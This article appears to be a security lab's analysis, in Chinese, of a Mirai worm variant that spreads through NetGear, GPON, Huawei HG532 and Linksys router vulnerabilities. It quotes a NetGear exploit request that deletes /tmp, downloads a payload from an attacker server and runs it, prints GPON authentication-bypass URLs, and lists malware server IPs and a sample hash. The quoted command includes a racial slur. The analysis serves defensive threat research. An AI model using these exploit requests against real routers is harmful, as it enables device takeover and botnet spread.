## 前言

 **近期腾讯安全云鼎实验室听风威胁感知平台监测发现一款攻击路由器的蠕虫病毒，经过分析，认定此款蠕虫是 mirai 病毒的新变种，和之前的 mirai
病毒不同，该蠕虫不仅仅通过初代 mirai 使用的 telnent 爆破进行攻击，更多通过路由器漏洞进行攻击传播。**

## 一、Payload 与漏洞分析

样本在传播和攻击过程中涉及到4个 PayLoad ，均针对路由器进行攻击，我们会对相关漏洞进行介绍，并针对传播情况利用抽样数据进行统计分析。

PayLoad 情况：

被攻击设备 | 设备型号 | 漏洞编号  
---|---|---  
NetGear路由器 | DGN1000、DGN2000 | CNNVD-201306-024  
GPON光纤路由器 | H640GR-02、H640GV-03、H640GW-02、H640RW-02、H645G | CVE-2018-10561/62  
华为HG532系列路由器 | HG532 | CVE-2017-17215  
linksys多款路由器 | Cisco Linksys E4200、EA4500、EA3500、EA2700、E1000、E2100L |
CNVD-2014-01260  
  
影响设备分布：

![](https://image.3001.net/images/20181122/1542889590_5bf6a076b52ba.png!small)

上图是几款路由器漏洞影响的国家范围，中国、俄罗斯、日本和美国是受灾较为严重的国家。与国家发展程度、网络普及程度有一定关系，也与上述几款路由器的销售区域有着较强的关联。由于国产设备多，安全性不高等原因，我国未来
IoT 安全面临着巨大的挑战。

下面我们针对这四个漏洞分别进行介绍：

### 01 NetGear 路由器任意执行漏洞（CNNVD-201306-024）

 **1）漏洞分析：**

POC 通过 GET 方法执行 setup.cgi，通过 todo 命令执行syscmd，通过 syscmd 来执行下载和执行病毒的命令。

    
    
    ' GET/setup.cgi ?next_file=netgear.cfg& todo=syscmd &cmd=rm+-rf+/tmp/*;wget+<http://46.17.47.82/gvv+-O+/tmp/nigger>;sh+nigger+netgear&curpath=/&ampcurrentsetting.htm=1HTTP/1.1\r\n\r\n'

代码如下：

A、执行 setup.cgi 后执行 setup_main：

![](https://image.3001.net/images/20181127/1543282510_5bfc9f4e7b160.png!small)

B、使用 GET 和 POST 方法都可以提交 POC：

![](https://image.3001.net/images/20181127/1543282534_5bfc9f66186da.png!small)

Todo 参数后面直接调取相关的文件执行，没有做任何过滤，这里也是被利用的地方，直接调用syscmd来执行自己想要的命令。

![](https://image.3001.net/images/20181127/1543282553_5bfc9f795db2e.png!small)

 **2）传播情况：**

图 NetGearDGN 设备远程任意命令执行漏洞攻击数据抽样统计：

![](https://image.3001.net/images/20181127/1543282575_5bfc9f8f0936f.png!small)

发起 NetGear 漏洞攻击最多的地区是俄罗斯，可以推断带有 NetGear 漏洞扫描的病毒载体感染量大。

### 02 GPON 光纤路由器命令执行漏洞（CVE-2018-10561/62）

 **1）漏洞分析：**

设备上运行的 HTTP 服务器在进行身份验证时会检查特定路径，攻击者可以利用这一特性绕过任意终端上的身份验证。

通过在 URL 后添加特定参数 ?images/，最终获得访问权限：

> [http://ip:port/menu.html?images/](http://ip/menu.html?images/)
>
>
> [http://ip:port/GponForm/diag_FORM?images/](http://ip/GponForm/diag_FORM?images/)

![](https://image.3001.net/images/20181127/1543282637_5bfc9fcdedbe1.png!small)

GPONPayLoad

 **2）传播情况：**

图 GPON 设备远程任意命令执行漏洞攻击数据抽样统计：

![](https://image.3001.net/images/20181127/1543282728_5bfca028d3e05.png!small)

此漏洞的病毒载体感染范围较大，对于中国、格鲁吉亚、埃及的影响最为广泛。中国美国的光纤发展迅速，埃及和格鲁吉亚受到中国影响，光纤发展速度也很快，也是他们受影响设备多的一个原因。

### 03 华为 HG532系列路由器远程命令执行漏（CVE-2017-17215）

 **1） 漏洞分析：**

![](https://image.3001.net/images/20181127/1543282794_5bfca06a265b7.png!small)

HG532 PayLoad

我们可以观察POC
首先提交一个身份认证信息，之后upgrade里面的NewStatusURL标签中执行了想要执行的命令。模块在upnp中，我们找到upnp模块，并找到NEwStatusURL标签，代码直接通过SYSTEM执行命令（upg
-g -u %s -t ‘Firmware Upgrade....’），没有做任何过滤。

 **2） 传播情况：**

![](https://image.3001.net/images/20181127/1543282827_5bfca08bc06cb.png!small)

华为HG532设备远程命令执行漏洞攻击数据抽样统计：

![](https://image.3001.net/images/20181127/1543282879_5bfca0bf4c047.png!small)

CVE-2017-17215 世界影响范围：

![](https://image.3001.net/images/20181127/1543282944_5bfca100c9c51.png!small)

通过华为HG532设备远程命令执行的攻击统计，可以看出，利用此漏洞的病毒载体或扫描在中国、日本、俄罗斯非常活跃。

### 04 Linksys多款路由器 tmUnblock.cgi ttcp_ip 参数远程命令执行漏洞（CNVD-2014-01260）

 **1）漏洞分析：**

多款Linksys路由器没有被正确过滤 'ttcp_ip' 参数值，在 tmUnblock.cgi
脚本的实现上存在安全漏洞，经过身份验证的远程攻击者可利用此漏洞执行任意命令。受影响产品包括但不局限于：

    
    
    E4200 E3200 E3000 E2500 E2100L E2000 E1550 E1500 E1200 E1000E900 E300 WAG320N WAP300N WAP610N WES610N WET610N WRT610N WRT600N WRT400N WRT320NWRT160N WRT150N

![](https://image.3001.net/images/20181127/1543283024_5bfca1508e640.png!small)

 **2）传播情况：**

Linksys 多款路由器设备远程命令执行漏洞攻击数据抽样统计：

![](https://image.3001.net/images/20181127/1543283142_5bfca1c60214b.png!small)

相关漏洞样本的下载地址很固定，基本分布于拉斯维加斯、新加坡、莫斯科和阿姆斯特丹这四个城市。经过黑产链条的团伙比对，针对路由器的黑产团伙服务器的配置位置，在这几个地方部署的量确实较大。

病毒服务器分布图：

![](https://image.3001.net/images/20181127/1543283261_5bfca23db94d9.png!small)

详细的服务器分布信息如下表所示：

漏洞 | IP 地址 | 地理位置  
---|---|---  
GPON光纤路由器命令执行漏洞（CVE-2018-10561/62） | 205.185.122.121（l.ocalhost.host） |
美国内华达州拉斯维加斯  
46.29.163.28（cnc.methaddict.xyz） | 俄罗斯莫斯科  
46.17.47.82 | 俄罗斯莫斯科  
46.29.166.125 | 俄罗斯莫斯科  
194.182.65.56 | 捷克  
128.199.137.201 | 新加坡  
185.244.25.176 | 荷兰北荷兰省阿姆斯特丹  
159.89.204.166 | 新加坡  
206.189.12.31 | 荷兰北荷兰省阿姆斯特丹  
128.199.222.37 | 新加坡  
185.244.25.188 | 荷兰北荷兰省阿姆斯特丹  
185.223.163.17 | 爱沙尼亚  
142.93.175.10 | 德国黑森州法兰克福  
46.183.218.247 | 拉脱维亚  
185.244.25.194 | 荷兰北荷兰省阿姆斯特丹  
176.32.33.123 | 俄罗斯莫斯科  
华为 HG532 系列路由器远程命令执行漏洞（CVE-2017-17215） | 209.141.33.86 | 美国内华达州拉斯维加斯  
167.88.161.40 | 美国内华达州拉斯维加斯  
213.183.63.181 | 保加利亚索非亚市州索非亚  
195.62.53.38 | 俄罗斯莫斯科  
Linksys多款路由器tmUnblock.cgi ttcp_ip参数远程命令执行漏洞（CNVD-2014-01260） | 209.141.33.119
| 美国内华达州拉斯维加斯  
209.141.50.26 | 美国内华达州拉斯维加斯  
185.244.25.222 | 荷兰北荷兰省阿姆斯特丹  
  
## 二、样本分析

样本 md5：

    
    
    099b88bb74e9751abb4091ac4f1d690d

源地址统计（112.28.77.217）：

> 13次，主要攻击了81、8080端口

下载 IP：

    
    
    46.17.47.82

样本与 mirai 是同一个家族的样本，是 mirai 病毒的一个变种。代码结构和解密后的字符串均非常相似，不同的是此变种使用了3个路由器漏洞进行传播。

Mirai bot 代码的结构如下：

![](https://image.3001.net/images/20181127/1543284679_5bfca7c70d9fd.png!small)

包含了攻击模块、扫描模块和结束模块三个大模块，此样本代码结构与 mirai 一样，只是相比增加了三种针对路由器的扫描模块。

![](https://image.3001.net/images/20181127/1543284704_5bfca7e03c740.png!small)

![](https://image.3001.net/images/20181127/1543284714_5bfca7ea25c69.png!small)

与以前的 mirai
不同，这里检测`/dev/watchdog，/dev/misc/watchdog，/dev/FTWDT101_watchdog，/dev/FTWDT101\
watchdog，/dev/FTWDT101/watchdog，/sbin/watchdog，/bin/watchdog，/dev/watchdog0，/etc/default/watchdog，/etc/watchdog`/等来避免重启。

相比传统的 mirai（/dev/watchdog，/dev/misc/watchdog）多了很多新的 watchdog 检测。同时包含了
Linux.Okiru 用来检测的路径（/dev/FTWDT101_watchdog，/dev/FTWDT101\watchdog）。

![](https://image.3001.net/images/20181127/1543284742_5bfca806e3d7e.png!small)

攻击服务器包含了很多相关的文件，各个操作系统平台上的，不同版本的文件。

![](https://image.3001.net/images/20181127/1543284834_5bfca862e7285.png!small)

样本溯源：

下图 POC 中包含了相关的下载地址：

![](https://image.3001.net/images/20181127/1543284873_5bfca88906138.png!small)

通过访问链接 46.17.47.82/cutie，发现其中包含了真正的下载链接。

![](https://image.3001.net/images/20181127/1543284900_5bfca8a453a6c.png!small)

保存的路径为：`/tmp/gdf ，/tmp/gxy，/tmp/dhf，/tmp/ttb;`

再直接访问根目录，包含了一条 Twitter 地址：

![](https://image.3001.net/images/20181127/1543284939_5bfca8cbba02c.png!small)

该 Twitter 的作者 Philly 是一个美国人，病毒存放的路径为 nigr（Philly 的自称），从 Twitter
中未发现直接与蠕虫相关的推文。

相关 Twitter 截图：

![](https://image.3001.net/images/20181127/1543284991_5bfca8ffc0d97.png!small)

关于样本捕获：

通过腾讯安全云鼎实验室听风威胁感知平台进行捕捉样本，听风威胁感知平台是云鼎实验室在全球多个节点部署的蜜罐网络集群，用于捕获真实的恶意流量，每天捕获数亿次的各类攻击请求。

相关捕捉界面如下：

![](https://image.3001.net/images/20181127/1543285019_5bfca91be4b0b.png!small)

## 参考文档

> <https://www.freebuf.com/vuls/171457.html>
>
> <https://www.linuxidc.com/Linux/2014-02/97171.htm>
>
> <https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-> cve-2017-17215/>

***本文作者：云鼎实验室，转载请注明来自FreeBuf.COM**

